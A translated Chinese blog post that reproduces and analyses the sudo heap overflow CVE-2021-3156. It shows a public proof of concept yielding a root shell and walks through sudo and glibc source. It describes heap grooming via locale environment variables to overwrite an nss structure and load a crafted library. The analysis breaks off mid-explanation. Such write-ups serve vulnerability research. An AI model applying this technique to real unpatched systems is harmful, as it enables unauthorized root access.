# CVE-2021-3156 sudo heap-based bufoverflow 复现&分析

阅读量 **309962**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-02-19 10:30:45

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01ab4d56ce84454ef9.jpg)

`CVE-2021-3156`是`sudo`的一个堆溢出漏洞，可以用来进行本地提权。在类`uninx`中非`root`可以使用`sudo`来以`root`的权限执行操作。由于`sudo`错误的转义了`\`导致了一个堆溢出漏洞。

漏洞影响版本为`1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1`，`sudo >=1.9.5sp2`的版本则不受影响。

感谢`luc`师傅带我飞。

## 环境搭建

这里我使用的是`docker ubuntu 20.04`，查看一下`sudo`版本，这里需要注意的是首先需要创建一个普通权限的用户

    
    
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ sudo --version
    Sudo version 1.8.31
    Sudoers policy plugin version 1.8.31
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.31
    

执行命令`sudoedit -s /`如果回显

    
    
    root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty# sudoedit -s /
    sudoedit: /: not a regular file
    

则表明存在漏洞，如果回显

    
    
    ➜  work sudoedit -s /
    usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
    

则表示漏洞已经被修复

## 漏洞分析

首先我们使用[exp](https://github.com/blasty/CVE-2021-3156)先执行一下

    
    
    root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty# su normal
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ls
    Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ make
    rm -rf libnss_X
    mkdir libnss_X
    gcc -o sudo-hax-me-a-sandwich hax.c
    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ./sudo-hax-me-a-sandwich 1
    
    ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
    
    using target: 'Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31'
    ** pray for your rootshell.. **
    [+] bl1ng bl1ng! We got it!
    # id
    uid=0(root) gid=0(root) groups=0(root),1000(normal)
    # exit
    normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$
    

当`sudo`以`-i,-s`参数启动即`MODE_SHELL,MODE_LOGIN_SHELl`标志启动的时候，`sudo`会使用`\`转义所有的元字符，并重写`argc,argv`

    
    
    //src/parse_args.c/parse_args
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
      char **av, *cmnd = NULL;
      int ac = 1;
    
      if (argc != 0) {
        /* shell -c "command" */
        char *src, *dst;
        size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
          strlen(argv[argc - 1]) + 1;
    
        cmnd = dst = reallocarray(NULL, cmnd_size, 2);
        if (cmnd == NULL)
          sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
        if (!gc_add(GC_PTR, cmnd))
          exit(1);
    
        for (av = argv; *av != NULL; av++) {// 串联所有的命令参数字符串
          for (src = *av; *src != '\0'; src++) {
            /* quote potential meta characters */
            // 用\转义所有的元字符
            if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
              *dst++ = '\\';
            *dst++ = *src;
          }
          *dst++ = ' ';
        }
        if (cmnd != dst)
          dst--;  /* replace last space with a NUL */
        *dst = '\0';
    
        ac += 2; /* -c cmnd */
      }
    
      // 重写argc，argv
      av = reallocarray(NULL, ac + 1, sizeof(char *));
      if (av == NULL)
        sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
      if (!gc_add(GC_PTR, av))
        exit(1);
    
      av[0] = (char *)user_details.shell; /* plugin may override shell */
      if (cmnd != NULL) {
        av[1] = "-c";
        av[2] = cmnd;
      }
      av[ac] = NULL;
    
      argv = av;
      argc = ac;
    }
    

之后会在`sudoers_policy_main`函数中调用`set_cmnd`函数

    
    
    //plugins/sudoers/sudoers.c
    int
      sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],
                          bool verbose, void *closure)
    {
      //...
      /* Find command in path and apply per-command Defaults. */
      cmnd_status = set_cmnd();
      if (cmnd_status == NOT_FOUND_ERROR)
        goto done;
      //...
    }
    
    static int
      set_cmnd(void)
    {
      //...
      if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
    
     847         if (NewArgc > 1) {
     848             char *to, *from, **av;
     849             size_t size, n;
     850
     851             /* Alloc and build up user_args. */
     852             for (size = 0, av = NewArgv + 1; *av; av++)
     853                 size += strlen(*av) + 1;
     854             if (size == 0 || (user_args = malloc(size)) == NULL) {
     855                 sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
     856                 debug_return_int(-1);
     857             }
     858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
     859                 /*
     860                  * When running a command via a shell, the sudo front-end
     861                  * escapes potential meta chars.  We unescape non-spaces
     862                  * for sudoers matching and logging purposes.
     863                  */
     864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
     865                     while (*from) {
     866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
     867                             from++;
     868                         *to++ = *from++;
     869                     }
     870                     *to++ = ' ';
     871                 }
     872                 *--to = '\0';
     873             } else {
     874                 //...
     885         }
     886     }
      }
    //...
    }
    

从代码中我们可以看出，函数首先按照`argv`中参数的大小申请一块堆空间`user_args`，然后依次将命令行参数链接到该堆空间中。

但是如果当一个命令行参数以反斜杠结尾，即`from[0]=\,from[1]=null`，就会满足`866`行的条件，使得`from++`指向`null`，但是之后`868`行执行的拷贝操作又会使得`from++`从而越过了`null`，那么接下来的`while`循环就会发生越界拷贝。拷贝的内容将会复制到`user_args`堆块中，从而发生堆溢出。

但是理论在设置了`MODE_SHELL,MODE_LOGIN_SHELL`的条件下任何命令行参数都不可能以`\`结尾，因为其在`parse_args`函数中会对所有的元字符进行转义包括这个`\`。

但是这两个函数中的判断条件有所不同

    
    
    //parse_args
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)){}
    //sudoers_policy_main
    if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
      if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)){}
    }
    

那么如果我们想要成功的利用堆溢出就需要在设置`flags=MODE_SHELL/MODE_LOGIN_SHELL`的条件下而不设置`mode=MODE_RUN`以避免转移代码的执行。那么根据`sudoers_policy_main`中的条件，我们只能设置`MODE_EDIT
| MODE_CHECK`这两个标志位了，来看一下设置的代码

    
    
            case 'e':
                if (mode && mode != MODE_EDIT)
                usage_excl(1);
                mode = MODE_EDIT;
                sudo_settings[ARG_SUDOEDIT].value = "true";
                valid_flags = MODE_NONINTERACTIVE;
                break;
            case 'l':
                if (mode) {
                if (mode == MODE_LIST)
                    SET(flags, MODE_LONG_LIST);
                else
                    usage_excl(1);
                }
                mode = MODE_LIST;
                valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
                break;
    
        if (argc > 0 && mode == MODE_LIST)
        mode = MODE_CHECK;
    

但是如果我们设置了这两个标志位，并且设置了`MODE_SHELL/MODE_LOGIN_SHELL`的话，在后续会被检测到并退出

    
    
    if ((flags & valid_flags) != flags)
      usage(1);// Give usage message and exit.
    

但是当我们以`sudoedit`执行的时候

    
    
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
      progname = "sudoedit";
      mode = MODE_EDIT;
      sudo_settings[ARG_SUDOEDIT].value = "true";
    }
    

这里只会设置`mode = MODE_EDIT`，而并不会设置`valid_flags`，也就不会检测退出，我们就可以正常执行到堆溢出的部分。

这个漏洞是非常友好的，因为我们可以通过控制命令行参数从而控制`user_args`堆块申请的大小，溢出的内容以及溢出的长度。并且攻击者可以通过以反斜杠结尾的方式实现向目标地址写`0`。

## 漏洞利用

###  背景知识

这在进行分析之前我们首先需要了解一下`locale`和`nss`相关的信息。

`locale`是根据计算机用户所使用的语言，所在的国家和地区所定义的一个软件运行时的语言环境，通常通过环境变量进行设置，`locale`相关的环境变量生效的顺序如下

  1. `LANGUAGE`指定个人对语言环境的主次偏好，如`zh_CN:en_US`
  2. `LC_ALL`是一个可以被`setlocale`设置的宏，其值可以覆盖所有其他的`locale`设定
  3. `LC_XXX`详细设定`locale`的各个方面，可以覆盖`LANG`的值
  4. `LANG`指定默认使用的`locale`

当`LC_ALL/LANG`被设置为`C`的时候，`LANGUAGE`的值将会被忽略。其命名规则如下

    
    
    language[_territory[.codeset]][@modifier]
    

其中`language`是[ISO
639-1](https://zh.wikipedia.org/wiki/ISO_639-1)标准中定义的双字母的语言代码，`territory`是[ISO
3166-1](https://zh.wikipedia.org/wiki/ISO_3166-1)标准中定义的双字母的国家和地区代码，`codeset`是字符集的名称
(如 UTF-8等)，而 `modifier` 则是某些`locale`变体的修正符。我们可以详细的设置共`12`个环境变量

    
    
    pwndbg> p _nl_category_names
    $1 = {
      str41 = "LC_COLLATE",
      str67 = "LC_CTYPE",
      str140 = "LC_MONETARY",
      str193 = "LC_NUMERIC",
      str207 = "LC_TIME",
      str259 = "LC_MESSAGES",
      str270 = "LC_PAPER",
      str279 = "LC_NAME",
      str292 = "LC_ADDRESS",
      str311 = "LC_TELEPHONE",
      str322 = "LC_MEASUREMENT",
      str330 = "LC_IDENTIFICATION"
    }
    

`nss`全称为`Name Service
Switch`，在`*nix`操作系统中，`nss`是`C`语言库的一部分，用来解析`name`，比如登陆用户的用户名以及`IP`地址到域名的解析。举个例子，当我们输入命令`ls
-alg`即查看一个目录中的文件列表，对于每一个文件我们可以看到它所属的用户和用户组，但是实际上系统中只保存了用户和用户组的`id`，要想显示与之相关的字符这就需要`nss`进行解析。我们可以在配置文件`/etc/nsswitch.conf`中定义相关数据库的查找规范

    
    
    root@2c3723801aeb:/home/normal/CVE-2021-3156_blasty# cat /etc/nsswitch.conf
    # /etc/nsswitch.conf
    #
    # Example configuration of GNU Name Service Switch functionality.
    # If you have the `glibc-doc-reference' and `info' packages installed, try:
    # `info libc "Name Service Switch"' for information about this file.
    
    passwd:         files systemd
    group:          files systemd
    shadow:         files
    gshadow:        files
    
    hosts:          files dns
    networks:       files
    
    protocols:      db files
    services:       db files
    ethers:         db files
    rpc:            db files
    
    netgroup:       nis
    

对于每个可用的查找规范即`service`都必须有文件`libnss_service.so.2`与之对应，例如`group`数据库定义了查找规范`files`，那么在调用`getgroup`函数的时候就会调用`libnss_files.so.2`中的`nss_lookup_function`函数进行查找。因此我们可以在`ubuntu`中找到下面的共享库

    
    
    libnss_compat-2.31.so
    libnss_compat.so
    libnss_compat.so.2
    libnss_dns-2.31.so
    libnss_dns.so
    libnss_dns.so.2
    libnss_files-2.31.so
    libnss_files.so
    libnss_files.so.2
    libnss_hesiod-2.31.so
    libnss_hesiod.so
    libnss_hesiod.so.2
    libnss_nis-2.31.so
    libnss_nis.so
    libnss_nis.so.2
    libnss_nisplus-2.31.so
    libnss_nisplus.so
    libnss_nisplus.so.2
    libnss_systemd.so.2
    

正常情况下当`sudo`调用到`__nss_lookup_function`情况如下

    
    
    In file: /root/glibc/sourceCode/glibc-2.31/nss/nsswitch.c
       408 #endif
       409
       410
       411 void *
       412 __nss_lookup_function (service_user *ni, const char *fct_name)
     ► 413 {
       414   void **found, *result;
       415
       416   /* We now modify global data.  Protect it.  */
       417   __libc_lock_lock (lock);
       418
    ───────────────────[ STACK]─────────
    00:0000│ rsp  0x7fffffffe358 —▸ 0x7ffff7e3713f (internal_getgrouplist+175) ◂— test   rax, rax
    01:0008│      0x7fffffffe360 ◂— 0x25b000000ae
    02:0010│      0x7fffffffe368 ◂— 0xffffff0000007d /* '}' */
    03:0018│      0x7fffffffe370 ◂— 0xffffffffffffffff
    04:0020│      0x7fffffffe378 —▸ 0x7fffffffe380 ◂— 0x1
    05:0028│      0x7fffffffe380 ◂— 0x1
    06:0030│      0x7fffffffe388 ◂— 0xc4e5bb2d41c2d00
    07:0038│      0x7fffffffe390 ◂— 0x0
    ───────────────────[ BACKTRACE ]─────────────────
     ► f 0     7ffff7e9bdf0 __nss_lookup_function
       f 1     7ffff7e3713f internal_getgrouplist+175
       f 2     7ffff7e373ed getgrouplist+109
       f 3     7ffff7f4fe16 sudo_getgrouplist2_v1+198
       f 4     7ffff7c53d63 sudo_make_gidlist_item+451
       f 5     7ffff7c52b0e sudo_get_gidlist+286
       f 6     7ffff7c4c86d runas_getgroups+93
       f 7     7ffff7c39d32 set_perms+1650
    ───────────────────────────────────────────────────────────────
    pwndbg> p *ni
    $1 = {
      next = 0x55555557fc10,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
      library = 0x0,
      known = 0x0,
      name = 0x55555557fc00 "files"
    }
    pwndbg> p *(ni->next)
    $2 = {
      next = 0x0,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
      library = 0x0,
      known = 0x0,
      name = 0x55555557fc40 "systemd"
    }
    pwndbg>
    

当调用`getgroup`函数的时候，`__nss_lookup_function`会依次加载`files,systemd`这两个`service
name`。而这两个`service name`的信息是存储在堆空间中的。看一下`__nss_lookup_function`函数的具体实现

    
    
    void *
    __nss_lookup_function (service_user *ni, const char *fct_name)
    {
      void **found, *result;
    
      /* We now modify global data.  Protect it.  */
      __libc_lock_lock (lock);
    
      /* Search the tree of functions previously requested.  Data in the
         tree are `known_function' structures, whose first member is a
         `const char *', the lookup key.  The search returns a pointer to
         the tree node structure; the first member of the is a pointer to
         our structure (i.e. what will be a `known_function'); since the
         first member of that is the lookup key string, &FCT_NAME is close
         enough to a pointer to our structure to use as a lookup key that
         will be passed to `known_compare' (above).  */
    
      found = __tsearch (&fct_name, &ni->known, &known_compare);
      if (found == NULL)
        /* This means out-of-memory.  */
        result = NULL;
      else if (*found != &fct_name)
        {
          //...
        }
      else
        {
          /* This name was not known before.  Now we have a node in the tree
         (in the proper sorted position for FCT_NAME) that points to
         &FCT_NAME instead of any real `known_function' structure.
         Allocate a new structure and fill it in.  */
    
          known_function *known = malloc (sizeof *known);
          if (! known)
        {
    //...
        }
          else
        {
          /* Point the tree node at this new structure.  */
          *found = known;
          known->fct_name = fct_name;
    
    #if !defined DO_STATIC_NSS || defined SHARED
          /* Load the appropriate library.  */
          if (nss_load_library (ni) != 0)
            /* This only happens when out of memory.  */
            goto remove_from_tree;
    
          //...
    
      return result;
    }
    libc_hidden_def (__nss_lookup_function)
    

在调用`nss_lookup_function`的时候一般`fct_name`是固定的字符串，所以这里我们直接进入`nss_load_library`函数

    
    
    static int
    nss_load_library (service_user *ni)
    {
      if (ni->library == NULL)
        {
          /* This service has not yet been used.  Fetch the service
         library for it, creating a new one if need be.  If there
         is no service table from the file, this static variable
         holds the head of the service_library list made from the
         default configuration.  */
          static name_database default_table;
          ni->library = nss_new_service (service_table ?: &default_table,
                         ni->name);
          if (ni->library == NULL)
        return -1;
        }
    
      if (ni->library->lib_handle == NULL)
        {
          /* Load the shared library.  */
          size_t shlen = (7 + strlen (ni->name) + 3
                  + strlen (__nss_shlib_revision) + 1);
          int saved_errno = errno;
          char shlib_name[shlen];
    
          /* Construct shared object name.  */
          __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
                              "libnss_"),
                        ni->name),
                  ".so"),
            __nss_shlib_revision);
    
          ni->library->lib_handle = __libc_dlopen (shlib_name);
          if (ni->library->lib_handle == NULL)
        {
          //...
        }
    # ifdef USE_NSCD
          else if (is_nscd)
        {
            //...
          }
    
      return 0;
    }
    #endif
    
    static service_library *
    nss_new_service (name_database *database, const char *name)
    {
      service_library **currentp = &database->library;
    
      while (*currentp != NULL)
        {
          if (strcmp ((*currentp)->name, name) == 0)
        return *currentp;
          currentp = &(*currentp)->next;
        }
    
      /* We have to add the new service.  */
      *currentp = (service_library *) malloc (sizeof (service_library));
      if (*currentp == NULL)
        return NULL;
    
      (*currentp)->name = name;
      (*currentp)->lib_handle = NULL;
      (*currentp)->next = NULL;
    
      return *currentp;
    }
    #endif
    

从代码中我们可以看出，如果`ni->library=NULL`，那么就会调用`nss_new_service`函数为其分配一个堆块，并对`name,lib_handle,next`赋值，完成之后进入`if
(ni->library->lib_handle ==
NULL)`分支，对`name`进行字符串拼接，也就是`libnss_+name+'.so.2'`，之后就会调用`__libc_dlopen`函数加载动态链接库。

由于`ni`的`service
name`结构体是分配在堆空间中的，而现在我们有存在`user_args`的堆溢出的漏洞，那么如果我们利用堆溢出将`service
name`结构体的除`name`之外的其他成员变量全部覆写为`0`，`name`覆写为`x/x`那么经过字符串拼接之后就会加载`libnss_x/x.so.2`的动态链接库，我们将`getshell`的代码写入`_init`之后编译为动态链接库即可。

接下来就是如何溢出的问题。为了防止溢出过程中覆写中间的关键结构体，`user_args`与`service
name`之间的距离要尽可能的小，最好的方法就是在`service
name`上方人为的释放一个堆块，之后`user_args`再申请该堆块进行溢出。目前分析的`exp`是通过`setlocale`实现的。我们首先来看一下`service_user`的初始化过程

在`sudo.c:191`会调用`get_user_info`函数在获取用户信息的时候需要获取用户的用户名和口令信息，这就需要到了`nss`服务，也就是需要调用`passwd`对应的服务规范。在函数中会调用根据配置文件初始化`file/systemd`等服务规范，调用栈如下

![](https://p3.ssl.qhimg.com/t017c2687cdf250009f.png)

其中关键的逻辑代码如下

    
    
    int
    __nss_database_lookup2 (const char *database, const char *alternate_name,
                const char *defconfig, service_user **ni)
    {
      //...
      if (service_table == NULL)
        /* Read config file.  */
        service_table = nss_parse_file (_PATH_NSSWITCH_CONF);
      //...
    }
    static name_database *
    nss_parse_file (const char *fname)
    {
      //...
      fp = fopen (fname, "rce");
      if (fp == NULL)
        return NULL;
      //...
      result = (name_database *) malloc (sizeof (name_database));
      if (result == NULL)
        {
          fclose (fp);
          return NULL;
        }
    
      result->entry = NULL;
      result->library = NULL;
      do
      {
        name_database_entry *this;
        ssize_t n;
    
        n = __getline (&line, &len, fp);
        if (n < 0)
          break;
        if (line[n - 1] == '\n')
          line[n - 1] = '\0';
    
        /* Because the file format does not know any form of quoting we
         can search forward for the next '#' character and if found
         make it terminating the line.  */
        *__strchrnul (line, '#') = '\0';
    
        /* If the line is blank it is ignored.  */
        if (line[0] == '\0')
          continue;
    
        /* Each line completely specifies the actions for a database.  */
        this = nss_getline (line);// 处理配置文件中的每一行
        if (this != NULL)
        {
          if (last != NULL)
            last->next = this;
          else
            result->entry = this;
    
          last = this;
        }
      }
      while (!__feof_unlocked (fp));
      //...
    }
    static name_database_entry *
    nss_getline (char *line)
    {
      //...
      result->service = nss_parse_service_list (line);// 处理文件中该行的所有服务规范
      //...
    }
    static service_user *
    nss_parse_service_list (const char *line)// 处理每一个服务规范
    {
      while (1)
      {
        new_service = (service_user *) malloc (sizeof (service_user)
                                               + (line - name + 1));
        // 赋值
        *nextp = new_service;
        nextp = &new_service->next;
        continue;
      }
    }
    

当配置文件中所有的服务规范全部处理完毕之后，形成了下面的列表，其中链表头存储在`libc`中。

    
    
    pwndbg> p &service_table
    $52 = (name_database **) 0x7ffff7f457a8 <service_table>
    pwndbg> p *service_table
    $53 = {
      entry = 0x5555555829d0,
      library = 0x0
    }
    pwndbg> p *service_table->entry
    $54 = {
      next = 0x555555582a70,
      service = 0x5555555829f0,
      name = 0x5555555829e0 "passwd"
    }
    pwndbg> p *service_table->entry->next
    $55 = {
      next = 0x5555555885b0,
      service = 0x555555588530,
      name = 0x555555582a80 "group"
    }
    pwndbg> p *service_table->entry->next->service
    $56 = {
      next = 0x555555588570,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
      library = 0x0,
      known = 0x0,
      name = 0x555555588560 "files"
    }
    

经过调试发现`get_user_info`函数中的堆块申请顺序如下

    
    
    malloc(0x100)
    malloc(0x400)
    malloc(0x1d8)// tcache
    malloc(0x10)
    malloc(0x78)// 固定0x80 // 释放
    malloc(0x1000) 
    malloc(0x17)// 以下均为固定申请，且不会释放
    malloc(0x36) 
    malloc(0x38)
    malloc(0x16)
    malloc(0x36)// group files
    

在`glibc>2.27`版本之上由于存在`tcache`，因此在申请堆块的时候会首先判断`tcache`中是否存在空闲的堆块。我们的目的是覆写`group
files`堆块，攻击如下首先是获取了`free`的原语，得到可以释放任意大小和数量的堆块之后进行了下面的布置。首先是`2`个`0x40`大小的堆块用来满足`passwd`的`service_user`的堆块的申请，然后释放一个堆块，用来满足`user_args`堆块的申请，然后再释放一个`0x40`大小的堆块用来满足`group
files service_user`的堆块的申请。

那么在`get_user_info`函数初始化所有的`service_user`堆块之后，在之后溢出`user_args`的时候就可以直接溢出到`group
files`的`service_user`结构体，就可以进行加载我们自己的动态链接库`getshell`。

###  free 原语

`sudo`在`main`函数的起始位置`sudo.c:154`调用了`setlocale(LC_ALL,
"");`函数，其中`locale=""`表示根据环境变量来设置`locale`。`setlocale`会申请和释放大量的堆块。来看一下`setlocale`函数的源码

    
    
    //setlocale(LC_ALL, "");
    //glibc/locale/setlocale.c
    char *
    setlocale (int category, const char *locale)
    {
      char *locale_path;
      size_t locale_path_len;
      const char *locpath_var;
      char *composite;
    
      //...
    
      if (category == LC_ALL)
      {
       //...
    
        /* Load the new data for each category.  */
        while (category-- > 0)
          if (category != LC_ALL)
          {
            // 循环查找环境变量中的LC*环境变量的值，并根据优先级顺序进行加载，环境变量的值会存储在newnames中
            newdata[category] = _nl_find_locale (locale_path, locale_path_len,
                                                 category,
                                                 &newnames[category]);
    
            //...
          }
        /* Create new composite name.  */
        composite = (category >= 0
                     ? NULL : new_composite_name (LC_ALL, newnames));
        if (composite != NULL)
        {
          //setname&setdata，即为_nl_global_locale.__names数组赋值，该数组中存储有所有的环境变量的值
          // 如果数组中原来存储有值，且不是默认的"C"，那么会释放原有的堆块
        }
        else
          for (++category; category < __LC_LAST; ++category)
            if (category != LC_ALL && newnames[category] != _nl_C_name
                && newnames[category] != _nl_global_locale.__names[category])
              free ((char *) newnames[category]);// 释放所有的newnames即环境变量的值
        //...
    
        return composite;
      }
      else
      {
        //...
      }
    }
    libc_hidden_def (setlocale)
    
    
    
    struct __locale_data *
      _nl_find_locale (const char *locale_path, size_t locale_path_len,
                       int category, const char **name)
    {
    
      if (cloc_name[0] == '\0')// 这里获取栈中的LC_ALL变量的值
      {
        /* The user decides which locale to use by setting environment
         variables.  */
        cloc_name = getenv ("LC_ALL");// 按照环境变量生效的顺序进行get
        if (!name_present (cloc_name))
          cloc_name = getenv (_nl_category_names_get (category));
        if (!name_present (cloc_name))
          cloc_name = getenv ("LANG");
        if (!name_present (cloc_name))
          cloc_name = _nl_C_name;
      }
    
      else if (!valid_locale_name (cloc_name))// 这里变量的值最大为255即0xff
      {
        __set_errno (EINVAL);
        return NULL;
      }
    
      *name = cloc_name;
    
      /* We really have to load some data.  First we try the archive,
         but only if there was no LOCPATH environment variable specified.  */
      if (__glibc_likely (locale_path == NULL))
      {
        struct __locale_data *data
          = _nl_load_locale_from_archive (category, name);
        if (__glibc_likely (data != NULL))
          return data;
    
        /* Nothing in the archive with the given name.  Expanding it as
         an alias and retry.  */
        cloc_name = _nl_expand_alias (*name);
        if (cloc_name != NULL)
        {
          data = _nl_load_locale_from_archive (category, &cloc_name);
          if (__builtin_expect (data != NULL, 1))
            return data;
        }
    
        /* Nothing in the archive.  Set the default path to search below.  */
        locale_path = _nl_default_locale_path;
        locale_path_len = sizeof _nl_default_locale_path;
      }
      else
        /* We really have to load some data.  First see whether the name is
           an alias.  Please note that this makes it impossible to have "C"
           or "POSIX" as aliases.  */
        cloc_name = _nl_expand_alias (*name);
    
      if (cloc_name == NULL)
        /* It is no alias.  */
        cloc_name = *name;
    
      /* Make a writable copy of the locale name.  */
      char *loc_name = strdupa (cloc_name);
    
        // language[_territory[.codeset]][@modifier]
      // 下面将按照👆的格式一依次进行解析，normalized_codeset是小写的codeset
      mask = _nl_explode_name (loc_name, &language, &modifier, &territory,
                               &codeset, &normalized_codeset);
      if (mask == -1)
        /* Memory allocate problem.  */
        return NULL;
    
      /* If exactly this locale was already asked for we have an entry with
         the complete name.  */
      // 
      /*
        abs_filename = (char *) malloc (dirlist_len
                      + strlen (language)
                      + ((mask & XPG_TERRITORY) != 0
                         ? strlen (territory) + 1 : 0)
                      + ((mask & XPG_CODESET) != 0
                         ? strlen (codeset) + 1 : 0)
                      + ((mask & XPG_NORM_CODESET) != 0
                         ? strlen (normalized_codeset) + 1 : 0)
                      + ((mask & XPG_MODIFIER) != 0
                         ? strlen (modifier) + 1 : 0)
                      + 1 + strlen (filename) + 1);
        */
      // 👇这个函数最为重要的是按照 👆的计算公式进行堆块的分配和释放
      locale_file = _nl_make_l10nflist (&_nl_locale_file_list[category],
                                        locale_path, locale_path_len, mask,
                                        language, territory, codeset,
                                        normalized_codeset, modifier,
                                        _nl_category_names_get (category), 0);
    
      if (locale_file == NULL)
      {
        /* Find status record for addressed locale file.  We have to search
         through all directories in the locale path.  */
        locale_file = _nl_make_l10nflist (&_nl_locale_file_list[category],
                                          locale_path, locale_path_len, mask,
                                          language, territory, codeset,
                                          normalized_codeset, modifier,
                                          _nl_category_names_get (category), 1);
        if (locale_file == NULL)
          /* This means we are out of core.  */
          return NULL;
      }
      //...
    
    }
    
    
    
    //intl/l10nflist.c
    struct loaded_l10nfile *
      _nl_make_l10nflist (struct loaded_l10nfile **l10nfile_list,
                          const char *dirlist, size_t dirlist_len,
                          int mask, const char *language, const char *territory,
                          const char *codeset, const char *normalized_codeset,
                          const char *modifier,
                          const char *filename, int do_allocate)
    {
      char *abs_filename;
      struct loaded_l10nfile *last = NULL;
      struct loaded_l10nfile *retval;
      char *cp;
      size_t entries;
      int cnt;
    
      /* Allocate room for the full file name.  */
      // 这里按照环境变量进行了堆块的分配，注意到这里传入的参数do_allocate=0
      // dirlist_len为0x10
      abs_filename = (char *) malloc (dirlist_len
                                      + strlen (language)
                                      + ((mask & XPG_TERRITORY) != 0
                                         ? strlen (territory) + 1 : 0)
                                      + ((mask & XPG_CODESET) != 0
                                         ? strlen (codeset) + 1 : 0)
                                      + ((mask & XPG_NORM_CODESET) != 0
                                         ? strlen (normalized_codeset) + 1 : 0)
                                      + ((mask & XPG_MODIFIER) != 0
                                         ? strlen (modifier) + 1 : 0)
                                      + 1 + strlen (filename) + 1);
    
      if (abs_filename == NULL)
        return NULL;
    
      // 这里会根据mask的值进行路径的拷贝
    
      /* Look in list of already loaded domains whether it is already
         available.  */
      last = NULL;
      for (retval = *l10nfile_list; retval != NULL; retval = retval->next)
        if (retval->filename != NULL)
        {
          int compare = strcmp (retval->filename, abs_filename);
          if (compare == 0)
            /* We found it!  */
            break;
          if (compare < 0)
          {
            /* It's not in the list.  */
            retval = NULL;
            break;
          }
    
          last = retval;
        }
    // 如果文件在l10nfile_list列表中，即之前已经查看过了，那么这里就直接释放abs_filename即之前申请的堆块。
      if (retval != NULL || do_allocate == 0)
      {
        free (abs_filename);// 这里会释放开头申请的堆块
        return retval;
      }
    //...
      // 这里通过改变mask（组合territory,codeset等通过mask控制的参数），穷举路径搜索配置文件
      cnt = __argz_count (dirlist, dirlist_len) == 1 ? mask - 1 : mask;
      for (; cnt >= 0; --cnt)
        if ((cnt & ~mask) == 0)
        {
          /* Iterate over all elements of the DIRLIST.  */
          char *dir = NULL;
    
          while ((dir = __argz_next ((char *) dirlist, dirlist_len, dir))
                 != NULL)
            retval->successor[entries++]
            = _nl_make_l10nflist (l10nfile_list, dir, strlen (dir) + 1, cnt,
                                  language, territory, codeset,
                                  normalized_codeset, modifier, filename, 1);
        }
      //...
    
      return retval;
    }
    

从上面的源码来看`setlocale`函数，如果传入的参数是`NULL`，那么就会返回`_nl_global_locale.__names`数组中对应的值即相应的`LC_*`的值。如果传入的参数是`“”`，那么就会根据环境变量设置`_nl_global_locale.__names`中的值，函数最主要的是进入了一个`while`循环，每次调用`_nl_find_locale`函数首先从环境变量中按照优先级顺序加载相应的环境变量，然后根据环境变量从`/usr/lib/locale`中查找有没有对应的文件，这里会根据`mask`的值控制加载的优先级，加载文件，如果没有对应的文件就会返回`NULL`。

> 这里比如LC_COLLATE=C.UTF-8[@aaaa](https://github.com/aaaa
> "@aaaa")，如果/usr/lib/locale/C.UTF-8[@aaaa](https://github.com/aaaa
> "@aaaa")/LC_COLLATE文件存在的话，那么就加载这个文件，否则就加载/usr/lib/locale/C.UTF-8/LC_COLLATE文件，当然这里有很多的路径选择，不止这两个。

当`_nl_find_locale`函数返回的为`NULL`的时候，`while`循环就会终止，此时`category>0`，那么这里就表明加载环境变量出现了错误，会释放之前申请的所有的`newnames`，也就是环境变量中的值比如`C.UTF-8[@aaaa](https://github.com/aaaa
"@aaaa")`。

否则当`while`循环执行完毕之后就会将所有的`_nl_global_locale.__names`数组中对应的值设置为我们输入的值，然后将`LC_ALL`赋值

![](https://p3.ssl.qhimg.com/t01bd575542cfec75ef.png)

